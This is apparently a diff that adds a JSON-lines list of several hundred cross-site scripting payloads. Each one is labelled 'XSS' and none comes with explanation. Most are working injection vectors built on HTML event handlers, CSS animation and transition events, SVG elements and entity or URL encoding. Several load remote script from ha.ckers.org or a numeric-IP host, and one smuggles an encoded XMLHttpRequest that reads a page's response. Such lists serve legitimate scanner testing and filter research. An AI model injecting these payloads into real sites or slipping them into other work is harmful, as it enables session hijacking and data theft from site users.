+{"payload": "<cite onmouseover=\"alert(1)\">test</cite>", "type": "XSS"}
+{"payload": "<noscript id=x tabindex=1 onfocus=alert(1)></noscript>", "type": "XSS"}
+{"payload": "<rb onbeforecopy=\"alert(1)\" contenteditable>test</rb>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><del style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></del>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></tbody>", "type": "XSS"}
+{"payload": "<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><strong style=\"animation-name:x\" onanimationend=\"alert(1)\"></strong>", "type": "XSS"}
+{"payload": "<plaintext onmousedown=\"alert(1)\">test</plaintext>", "type": "XSS"}
+{"payload": "<param draggable=\"true\" ondragend=\"alert(1)\">test</param>", "type": "XSS"}
+{"payload": "<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>", "type": "XSS"}
+{"payload": "<svg><a onload=alert(1)></a>", "type": "XSS"}
+{"payload": "<bdi onmouseover=\"alert(1)\">test</bdi>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>", "type": "XSS"}
+{"payload": "<footer onmouseenter=\"alert(1)\">test</footer>", "type": "XSS"}
+{"payload": "<tbody onmousemove=\"alert(1)\">test</tbody>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationstart=\"alert(1)\"></plaintext>", "type": "XSS"}
+{"payload": "<svg><element onload=alert(1)></element>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><i id=x style=\"transition:color 1s\" ontransitionend=alert(1)></i>", "type": "XSS"}
+{"payload": "<img src=validimage.png onloadstart=alert(1)>", "type": "XSS"}
+{"payload": "<output onbeforecut=\"alert(1)\" contenteditable>test</output>", "type": "XSS"}
+{"payload": "<nextid onmouseenter=\"alert(1)\">test</nextid>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><template style=\"animation-name:x\" onanimationstart=\"alert(1)\"></template>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>", "type": "XSS"}
+{"payload": "<svg><caption onload=alert(1)></caption>", "type": "XSS"}
+{"payload": "<video onmouseout=\"alert(1)\">test</video>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noscript>", "type": "XSS"}
+{"payload": "<fieldset onmouseleave=\"alert(1)\">test</fieldset>", "type": "XSS"}
+{"payload": "<svg><menuitem onload=alert(1)></menuitem>", "type": "XSS"}
+{"payload": "<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>", "type": "XSS"}
+{"payload": "<acronym draggable=\"true\" ondragend=\"alert(1)\">test</acronym>", "type": "XSS"}
+{"payload": "<tbody onpaste=\"alert(1)\" contenteditable>test</tbody>", "type": "XSS"}
+{"payload": "<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>", "type": "XSS"}
+{"payload": "<mark id=x tabindex=1 onfocusin=alert(1)></mark>", "type": "XSS"}
+{"payload": "<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>", "type": "XSS"}
+{"payload": "<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>", "type": "XSS"}
+{"payload": "<rt onpaste=\"alert(1)\" contenteditable>test</rt>", "type": "XSS"}
+{"payload": "<strike ondblclick=\"alert(1)\">test</strike>", "type": "XSS"}
+{"payload": "<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>", "type": "XSS"}
+{"payload": "<details onbeforecut=\"alert(1)\" contenteditable>test</details>", "type": "XSS"}
+{"payload": "<b id=x tabindex=1 onbeforeactivate=alert(1)></b>", "type": "XSS"}
+{"payload": "<tfoot onpaste=\"alert(1)\" contenteditable>test</tfoot>", "type": "XSS"}
+{"payload": "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "type": "XSS"}
+{"payload": "<datalist id=x tabindex=1 onfocus=alert(1)></datalist>", "type": "XSS"}
+{"payload": "<applet onkeyup=\"alert(1)\" contenteditable>test</applet>", "type": "XSS"}
+{"payload": "<dfn onkeypress=\"alert(1)\" contenteditable>test</dfn>", "type": "XSS"}
+{"payload": "<samp draggable=\"true\" ondragend=\"alert(1)\">test</samp>", "type": "XSS"}
+{"payload": "<u id=x tabindex=1 onfocusin=alert(1)></u>", "type": "XSS"}
+{"payload": "<datalist onbeforepaste=\"alert(1)\" contenteditable>test</datalist>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><center style=\"animation-name:x\" onanimationstart=\"alert(1)\"></center>", "type": "XSS"}
+{"payload": "<ins onkeypress=\"alert(1)\" contenteditable>test</ins>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><hgroup id=x style=\"transition:color 1s\" ontransitionend=alert(1)></hgroup>", "type": "XSS"}
+{"payload": "<p onbeforecopy=\"alert(1)\" contenteditable>test</p>", "type": "XSS"}
+{"payload": "<nextid oncontextmenu=\"alert(1)\">test</nextid>", "type": "XSS"}
+{"payload": "<canvas onmouseenter=\"alert(1)\">test</canvas>", "type": "XSS"}
+{"payload": "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>", "type": "XSS"}
+{"payload": "<script onkeydown=\"alert(1)\" contenteditable>test</script>", "type": "XSS"}
+{"payload": "<applet draggable=\"true\" ondragstart=\"alert(1)\">test</applet>", "type": "XSS"}
+{"payload": "<nextid onmouseup=\"alert(1)\">test</nextid>", "type": "XSS"}
+{"payload": "<td onkeypress=\"alert(1)\" contenteditable>test</td>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><u style=\"animation-name:x\" onanimationstart=\"alert(1)\"></u>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><summary id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></summary>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><basefont style=\"animation-name:x\" onanimationend=\"alert(1)\"></basefont>", "type": "XSS"}
+{"payload": "<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>", "type": "XSS"}
+{"payload": "<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>", "type": "XSS"}
+{"payload": "<sub draggable=\"true\" ondrag=\"alert(1)\">test</sub>", "type": "XSS"}
+{"payload": "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", "type": "XSS"}
+{"payload": "<shadow onkeypress=\"alert(1)\" contenteditable>test</shadow>", "type": "XSS"}
+{"payload": "<svg onkeypress=\"alert(1)\" contenteditable>test</svg>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>", "type": "XSS"}
+{"payload": "<em onmouseleave=\"alert(1)\">test</em>", "type": "XSS"}
+{"payload": "<source onmouseup=\"alert(1)\">test</source>", "type": "XSS"}
+{"payload": "<source oncontextmenu=\"alert(1)\">test</source>", "type": "XSS"}
+{"payload": "<rtc draggable=\"true\" ondragstart=\"alert(1)\">test</rtc>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>", "type": "XSS"}
+{"payload": "<menu ondblclick=\"alert(1)\">test</menu>", "type": "XSS"}
+{"payload": "<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><aside style=\"animation-name:x\" onanimationend=\"alert(1)\"></aside>", "type": "XSS"}
+{"payload": "<iframe src=/ onload=eval(unescape(this.name.replace(/\\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>", "type": "XSS"}
+{"payload": "<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>", "type": "XSS"}
+{"payload": "<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><table style=\"animation-name:x\" onanimationstart=\"alert(1)\"></table>", "type": "XSS"}
+{"payload": "<strong ondblclick=\"alert(1)\">test</strong>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><rtc style=\"animation-name:x\" onanimationend=\"alert(1)\"></rtc>", "type": "XSS"}
+{"payload": "<area draggable=\"true\" ondragend=\"alert(1)\">test</area>", "type": "XSS"}
+{"payload": "<p id=x tabindex=1 onfocus=alert(1)></p>", "type": "XSS"}
+{"payload": "<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>", "type": "XSS"}
+{"payload": "<ul id=x tabindex=1 onfocusin=alert(1)></ul>", "type": "XSS"}
+{"payload": "<main draggable=\"true\" ondrag=\"alert(1)\">test</main>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><area style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></area>", "type": "XSS"}
+{"payload": "<dfn onmousedown=\"alert(1)\">test</dfn>", "type": "XSS"}
+{"payload": "<label onkeyup=\"alert(1)\" contenteditable>test</label>", "type": "XSS"}
+{"payload": "<output oncopy=\"alert(1)\" contenteditable>test</output>", "type": "XSS"}
+{"payload": "<caption onkeypress=\"alert(1)\" contenteditable>test</caption>", "type": "XSS"}
+{"payload": "<iframe onmouseenter=\"alert(1)\">test</iframe>", "type": "XSS"}
+{"payload": "<details id=x tabindex=1 onbeforeactivate=alert(1)></details>", "type": "XSS"}
+{"payload": "<main oncut=\"alert(1)\" contenteditable>test</main>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>", "type": "XSS"}
+{"payload": "<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>", "type": "XSS"}
+{"payload": "<a onmouseout=\"alert(1)\">test</a>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><tfoot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></tfoot>", "type": "XSS"}
+{"payload": "<progress draggable=\"true\" ondragenter=\"alert(1)\">test</progress>", "type": "XSS"}
+{"payload": "<sup id=x tabindex=1 onfocus=alert(1)></sup>", "type": "XSS"}
+{"payload": "<shadow oncut=\"alert(1)\" contenteditable>test</shadow>", "type": "XSS"}
+{"payload": "<tbody onbeforecut=\"alert(1)\" contenteditable>test</tbody>", "type": "XSS"}
+{"payload": "<strong onbeforecopy=\"alert(1)\" contenteditable>test</strong>", "type": "XSS"}
+{"payload": "<frame draggable=\"true\" ondrag=\"alert(1)\">test</frame>", "type": "XSS"}
+{"payload": "<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>", "type": "XSS"}
+{"payload": "<h1 onkeyup=\"alert(1)\" contenteditable>test</h1>", "type": "XSS"}
+{"payload": "<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>", "type": "XSS"}
+{"payload": "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "type": "XSS"}
+{"payload": "<video onloadeddata=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><figure style=\"animation-name:x\" onanimationstart=\"alert(1)\"></figure>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></param>", "type": "XSS"}
+{"payload": "<plaintext onmouseover=\"alert(1)\">test</plaintext>", "type": "XSS"}
+{"payload": "<svg><strong onload=alert(1)></strong>", "type": "XSS"}
+{"payload": "<big draggable=\"true\" ondrag=\"alert(1)\">test</big>", "type": "XSS"}
+{"payload": "<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>", "type": "XSS"}
+{"payload": "<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>", "type": "XSS"}
+{"payload": "<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>", "type": "XSS"}
+{"payload": "<meta onkeydown=\"alert(1)\" contenteditable>test</meta>", "type": "XSS"}
+{"payload": "<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>", "type": "XSS"}
+{"payload": "<td id=x tabindex=1 onactivate=alert(1)></td>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></blockquote>", "type": "XSS"}
+{"payload": "<footer oncontextmenu=\"alert(1)\">test</footer>", "type": "XSS"}
+{"payload": "<frame onmouseenter=\"alert(1)\">test</frame>", "type": "XSS"}
+{"payload": "<template onkeydown=\"alert(1)\" contenteditable>test</template>", "type": "XSS"}
+{"payload": "<colgroup onclick=\"alert(1)\">test</colgroup>", "type": "XSS"}
+{"payload": "<script src=//3334957647/1>", "type": "XSS"}
+{"payload": "<samp onmouseout=\"alert(1)\">test</samp>", "type": "XSS"}
+{"payload": "<form><button formaction=\"javascript:alert(1)\">//INJECTX", "type": "XSS"}
+{"payload": "<tr id=x tabindex=1 onfocus=alert(1)></tr>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>", "type": "XSS"}
+{"payload": "<figure onmouseout=\"alert(1)\">test</figure>", "type": "XSS"}
+{"payload": "<colgroup onbeforepaste=\"alert(1)\" contenteditable>test</colgroup>", "type": "XSS"}
+{"payload": "<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"93\"><div style=\"list-style:url(http://foo.f)\\20url(javascript:alert(93));\">X</div>//[\"'`-->]]>]</div>", "type": "XSS"}
+{"payload": "<bdi draggable=\"true\" ondragstart=\"alert(1)\">test</bdi>", "type": "XSS"}
+{"payload": "<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>", "type": "XSS"}
+{"payload": "<mark onmouseup=\"alert(1)\">test</mark>", "type": "XSS"}
+{"payload": "<i draggable=\"true\" ondragend=\"alert(1)\">test</i>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><dd id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></dd>", "type": "XSS"}
+{"payload": "<meter onmouseout=\"alert(1)\">test</meter>", "type": "XSS"}
+{"payload": "<time id=x tabindex=1 onfocusin=alert(1)></time>", "type": "XSS"}
+{"payload": "<basefont ondblclick=\"alert(1)\">test</basefont>", "type": "XSS"}
+{"payload": "<dt draggable=\"true\" ondragstart=\"alert(1)\">test</dt>", "type": "XSS"}
+{"payload": "<scRiPt y=\"><\">/*<sCRipt* */prompt()</script", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><u id=x style=\"transition:color 1s\" ontransitionend=alert(1)></u>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><tr id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></tr>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></svg>", "type": "XSS"}
+{"payload": "<strike onkeydown=\"alert(1)\" contenteditable>test</strike>", "type": "XSS"}
+{"payload": "SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "type": "XSS"}
+{"payload": "<sub id=x tabindex=1 onactivate=alert(1)></sub>", "type": "XSS"}
+{"payload": "<tt draggable=\"true\" ondrag=\"alert(1)\">test</tt>", "type": "XSS"}
+{"payload": "<svg id=x onfocus=alert(1)>", "type": "XSS"}
+{"payload": "<x onclick=alert(1)>click this!", "type": "XSS"}
+{"payload": "<keygen onmouseover=\"alert(1)\">test</keygen>", "type": "XSS"}
+{"payload": "<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>", "type": "XSS"}
+{"payload": "<section onmouseover=\"alert(1)\">test</section>", "type": "XSS"}
+{"payload": "<video draggable=\"true\" ondragend=\"alert(1)\">test</video>", "type": "XSS"}
+{"payload": "<svg onload=alert(1)>", "type": "XSS"}
+{"payload": "<figcaption draggable=\"true\" ondragend=\"alert(1)\">test</figcaption>", "type": "XSS"}
+{"payload": "<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>", "type": "XSS"}
+{"payload": "<blockquote onmouseover=\"alert(1)\">test</blockquote>", "type": "XSS"}
+{"payload": "<noframes onbeforepaste=\"alert(1)\" contenteditable>test</noframes>", "type": "XSS"}
+{"payload": "<s onmouseleave=\"alert(1)\">test</s>", "type": "XSS"}
+{"payload": "<font onbeforepaste=\"alert(1)\" contenteditable>test</font>", "type": "XSS"}
+{"payload": "<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>", "type": "XSS"}
+{"payload": "<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>", "type": "XSS"}
+{"payload": "<applet onreadystatechange=alert(1)></applet>", "type": "XSS"}
+{"payload": "<footer onbeforecopy=\"alert(1)\" contenteditable>test</footer>", "type": "XSS"}
+{"payload": "<spacer onmouseenter=\"alert(1)\">test</spacer>", "type": "XSS"}
+{"payload": "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "type": "XSS"}
+{"payload": "<big id=x tabindex=1 onactivate=alert(1)></big>", "type": "XSS"}
+{"payload": "<legend onclick=\"alert(1)\">test</legend>", "type": "XSS"}
+{"payload": "<table onmouseover=\"alert(1)\">test</table>", "type": "XSS"}
+{"payload": "<video onmouseenter=\"alert(1)\">test</video>", "type": "XSS"}
+{"payload": "<slot onmouseleave=\"alert(1)\">test</slot>", "type": "XSS"}
+{"payload": "<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>", "type": "XSS"}
+{"payload": "<base onmousedown=\"alert(1)\">test</base>", "type": "XSS"}
+{"payload": "<i id=x tabindex=1 onfocus=alert(1)></i>", "type": "XSS"}
+{"payload": "<form onmouseout=\"alert(1)\">test</form>", "type": "XSS"}
+{"payload": "<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>", "type": "XSS"}
+{"payload": "<area id=x tabindex=1 onactivate=alert(1)></area>", "type": "XSS"}
+{"payload": "<header onmousemove=\"alert(1)\">test</header>", "type": "XSS"}
+{"payload": "<col onkeyup=\"alert(1)\" contenteditable>test</col>", "type": "XSS"}
+{"payload": "<shadow onpaste=\"alert(1)\" contenteditable>test</shadow>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><audio id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></audio>", "type": "XSS"}
+{"payload": "<td onkeydown=\"alert(1)\" contenteditable>test</td>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><multicol id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></multicol>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><fieldset style=\"animation-name:x\" onanimationend=\"alert(1)\"></fieldset>", "type": "XSS"}
+{"payload": "<td draggable=\"true\" ondragstart=\"alert(1)\">test</td>", "type": "XSS"}
+{"payload": "<div id=\"128\"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[\"'`-->]]>]</div>", "type": "XSS"}
+{"payload": "<s onbeforecopy=\"alert(1)\" contenteditable>test</s>", "type": "XSS"}
+{"payload": "<col onbeforecopy=\"alert(1)\" contenteditable>test</col>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>", "type": "XSS"}
+{"payload": "<dl onclick=\"alert(1)\">test</dl>", "type": "XSS"}
+{"payload": "<fieldset onbeforecopy=\"alert(1)\" contenteditable>test</fieldset>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><bdi style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bdi>", "type": "XSS"}
+{"payload": "<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>", "type": "XSS"}
+{"payload": "<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>", "type": "XSS"}
+{"payload": "<var onmouseover=\"prompt(1)\">On Mouse Over</var>?", "type": "XSS"}
+{"payload": "<audio draggable=\"true\" ondragstart=\"alert(1)\">test</audio>", "type": "XSS"}
+{"payload": "<svg><set onbegin=alert(1) attributename=x dur=1s>", "type": "XSS"}
+{"payload": "<frame draggable=\"true\" ondragend=\"alert(1)\">test</frame>", "type": "XSS"}
+{"payload": "<cite onbeforepaste=\"alert(1)\" contenteditable>test</cite>", "type": "XSS"}
+{"payload": "<dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>", "type": "XSS"}
+{"payload": "<rtc oncontextmenu=\"alert(1)\">test</rtc>", "type": "XSS"}
+{"payload": "<tt draggable=\"true\" ondragleave=\"alert(1)\">test</tt>", "type": "XSS"}
+{"payload": "<meter onbeforepaste=\"alert(1)\" contenteditable>test</meter>", "type": "XSS"}
+{"payload": "<head onmouseup=\"alert(1)\">test</head>", "type": "XSS"}
+{"payload": "<dir draggable=\"true\" ondrag=\"alert(1)\">test</dir>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><noframes style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noframes>", "type": "XSS"}
+{"payload": "<article onmousemove=\"alert(1)\">test</article>", "type": "XSS"}
+{"payload": "<audio id=x tabindex=1 onactivate=alert(1)></audio>", "type": "XSS"}
+{"payload": "<track onmouseleave=\"alert(1)\">test</track>", "type": "XSS"}
+{"payload": "<x onmouseover=alert(1)>hover this!", "type": "XSS"}
+{"payload": "<bdo onkeydown=\"alert(1)\" contenteditable>test</bdo>", "type": "XSS"}
+{"payload": "<applet onbeforepaste=\"alert(1)\" contenteditable>test</applet>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><meter style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></meter>", "type": "XSS"}
+{"payload": "<keygen draggable=\"true\" ondragend=\"alert(1)\">test</keygen>", "type": "XSS"}
+{"payload": "<rp draggable=\"true\" ondrag=\"alert(1)\">test</rp>", "type": "XSS"}
+{"payload": "<marquee id=x tabindex=1 onbeforeactivate=alert(1)></marquee>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>", "type": "XSS"}
+{"payload": "<dd onclick=\"alert(1)\">test</dd>", "type": "XSS"}
+{"payload": "<plaintext onkeyup=\"alert(1)\" contenteditable>test</plaintext>", "type": "XSS"}
+{"payload": "<article draggable=\"true\" ondragend=\"alert(1)\">test</article>", "type": "XSS"}
+{"payload": "<embed onpaste=\"alert(1)\" contenteditable>test</embed>", "type": "XSS"}
+{"payload": "<figure onmouseleave=\"alert(1)\">test</figure>", "type": "XSS"}
+{"payload": "<dt onmousemove=\"alert(1)\">test</dt>", "type": "XSS"}
+{"payload": "<img src/onerror=alert(1)>", "type": "XSS"}
+{"payload": "<strong id=x tabindex=1 onactivate=alert(1)></strong>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></time>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><ruby style=\"animation-name:x\" onanimationend=\"alert(1)\"></ruby>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><rb id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rb>", "type": "XSS"}
+{"payload": "<audio oncopy=\"alert(1)\" contenteditable>test</audio>", "type": "XSS"}
+{"payload": "<pre draggable=\"true\" ondrag=\"alert(1)\">test</pre>", "type": "XSS"}
+{"payload": "<div id=\"87\"><svg xmlns=\"http://www.w3.org/2000/svg\">", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><q style=\"animation-name:x\" onanimationend=\"alert(1)\"></q>", "type": "XSS"}
+{"payload": "<dl oncopy=\"alert(1)\" contenteditable>test</dl>", "type": "XSS"}
+{"payload": "<figcaption onkeyup=\"alert(1)\" contenteditable>test</figcaption>", "type": "XSS"}
+{"payload": "<optgroup onpaste=\"alert(1)\" contenteditable>test</optgroup>", "type": "XSS"}
+{"payload": "<param id=x tabindex=1 onactivate=alert(1)></param>", "type": "XSS"}
+{"payload": "<iframe ondblclick=\"alert(1)\">test</iframe>", "type": "XSS"}
+{"payload": "<rb ondblclick=\"alert(1)\">test</rb>", "type": "XSS"}
+{"payload": "<font onbeforecut=\"alert(1)\" contenteditable>test</font>", "type": "XSS"}
+{"payload": "<select onkeyup=\"alert(1)\" contenteditable>test</select>", "type": "XSS"}
+{"payload": "<video autoplay onloadedmetadata=alert(1)> <source src=\"validvideo.mp4\" type=\"video/mp4\"></video>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>", "type": "XSS"}
+{"payload": "<dir onmousedown=\"alert(1)\">test</dir>", "type": "XSS"}
+{"payload": "INJECTXXXXXXXXXXX", "type": "XSS"}
+{"payload": "<optgroup onmousedown=\"alert(1)\">test</optgroup>", "type": "XSS"}
+{"payload": "?goto=javascript:alert(1)\",", "type": "XSS"}
+{"payload": "<img srcset=validimage.png onload=alert(1)>", "type": "XSS"}
+{"payload": "<dialog onmouseleave=\"alert(1)\">test</dialog>", "type": "XSS"}
+{"payload": "<option id=x tabindex=1 onactivate=alert(1)></option>", "type": "XSS"}
+{"payload": "<samp onmouseleave=\"alert(1)\">test</samp>", "type": "XSS"}
+{"payload": "<details onmouseenter=\"alert(1)\">test</details>", "type": "XSS"}
+{"payload": "<footer onclick=\"alert(1)\">test</footer>", "type": "XSS"}
+{"payload": "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", "type": "XSS"}
+{"payload": "<bdi onbeforepaste=\"alert(1)\" contenteditable>test</bdi>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><div id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></div>", "type": "XSS"}
+{"payload": "<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>", "type": "XSS"}
+{"payload": "<iframe onmousedown=\"alert(1)\">test</iframe>", "type": "XSS"}
+{"payload": "<nextid id=x tabindex=1 onfocus=alert(1)></nextid>", "type": "XSS"}
+{"payload": "<element id=x tabindex=1 onactivate=alert(1)></element>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>", "type": "XSS"}
+{"payload": "<svg><content onload=alert(1)></content>", "type": "XSS"}
+{"payload": "<svg><listing onload=alert(1)></listing>", "type": "XSS"}
+{"payload": "<a oncopy=\"alert(1)\" contenteditable>test</a>", "type": "XSS"}
+{"payload": "<img oncontextmenu=\"alert(1)\">test</img>", "type": "XSS"}
+{"payload": "<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>", "type": "XSS"}
+{"payload": "<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><isindex id=x style=\"transition:color 1s\" ontransitionend=alert(1)></isindex>", "type": "XSS"}
+{"payload": "<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>", "type": "XSS"}
+{"payload": "<fieldset oncopy=\"alert(1)\" contenteditable>test</fieldset>", "type": "XSS"}
+{"payload": "<nobr onmouseout=\"alert(1)\">test</nobr>", "type": "XSS"}
+{"payload": "<q onbeforecut=\"alert(1)\" contenteditable>test</q>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><html id=x style=\"transition:color 1s\" ontransitionend=alert(1)></html>", "type": "XSS"}
+{"payload": "<multicol onmouseover=\"alert(1)\">test</multicol>", "type": "XSS"}
+{"payload": "<param id=x tabindex=1 onbeforeactivate=alert(1)></param>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><figcaption id=x style=\"transition:color 1s\" ontransitionend=alert(1)></figcaption>", "type": "XSS"}
+{"payload": "<center onbeforecut=\"alert(1)\" contenteditable>test</center>", "type": "XSS"}
